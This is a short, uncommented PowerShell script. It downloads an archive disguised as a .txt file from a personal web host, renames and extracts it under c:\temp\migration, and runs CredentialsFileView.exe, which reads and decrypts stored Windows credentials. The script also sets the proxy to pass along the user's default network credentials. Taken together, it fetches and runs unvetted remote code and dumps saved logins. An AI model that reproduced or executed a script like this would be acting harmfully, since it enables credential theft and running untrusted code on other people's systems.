[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
cls
 
 
powershell -command "& { iwr http://jb92paris.free.fr/EasyDeploy.txt -OutFile c:\temp\migration\credentialsfileview-x64.txt }"
 
 
 
Rename-Item c:\temp\migration\credentialsfileview-x64.txt credentialsfileview-x64.zip -Force
mkdir -f c:\temp\migration\credentialsfileview-x64
 
powershell.exe -nologo -noprofile -command "& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('c:\temp\migration\credentialsfileview-x64.zip', 'c:\temp\migration\'); }"
 
cd C:\temp\migration\credentialsfileview-x64

cmd /c CredentialsFileView.exe
 
timeout 99